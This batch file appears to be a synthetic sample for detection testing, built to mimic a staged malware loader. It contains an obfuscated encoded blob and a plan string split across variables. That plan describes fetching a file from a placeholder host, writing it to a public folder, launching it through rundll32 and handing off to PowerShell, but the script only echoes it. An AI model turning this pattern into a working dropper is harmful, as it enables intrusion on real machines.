@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|reverse_xor
rem HUNTRESS-MATERIAL:AkBDHVdXBgoGAApXVQQeVlRSR0AOVlRSR0BsR0tWXU9HUlcdV1cGCgYACldVBB5WVFJHQG9RUn9AQFZBR11Ge29QWl9RRmNvQEFWQGZvCXAOW0dSQ2xWX1pVT0dSVx0KVQYBAwpXABxXWl9SRV1aHVZfQ15SS1YdV1cGCgYACldVBBwcCUBDR0dbDl9BRk9XVwYKBgAKV1UEHl1UWlJDXlJQDldabF1UWlJDXlJQT19fVltAQVZEXEMOVlRSRlRdUl9sR0tWXU9XXVxeUlpXDltDUkFUTwcOR11GXFBsVlRSR0BPVktWHQEAX19XXUZBDkFWR0NSV1JPR0NaQVBAbFVVXFddUlsfQEBWUFxBQ2xbUEdSQ0BaVx9WX1pVbFZHWkFEH1ZHXF5WQWxWQVpGQlBSDkBDVkdATwIORQ==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "item0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=run"& rem HUNTRESS quote compound
set "item1=dll32.exe|stage_count=4|graph=diamond|next_language=powershell|campaign_id=camp"& rem HUNTRESS quote compound
set "item2=aign-7fd93595dd|url=https://7fd93595dd.example.invalid/3d9025f9.dat|file_path=C"& rem HUNTRESS quote compound
set "item3=:\Users\Public\HuntressLab\stage-7fd93595dd.dat|next_stage=stage-7fd93595dd.ps1"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=1760ca81"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "item9=%item0%%item1%%item2%%item3%"
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo rundll32.exe acquire, write, dispatch, and hand off stage-7fd93595dd.ps1
exit /b 0
